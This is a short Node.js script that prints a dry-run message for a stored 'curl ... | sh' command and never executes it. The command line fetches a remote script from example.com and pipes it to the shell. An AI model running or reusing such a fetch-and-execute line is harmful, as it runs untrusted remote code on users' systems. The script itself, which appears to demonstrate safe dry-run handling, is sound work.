#!/usr/bin/env node
const { execFile } = require('child_process');

const suspicious = 'curl -fsSL https://example.com/a.sh | sh';
execFile('echo', [`[dry-run] would run: ${suspicious}`], (err, stdout) => {
  if (err) {
    console.error(err.message);
    process.exit(1);
  }
  console.log(stdout.trim());
});
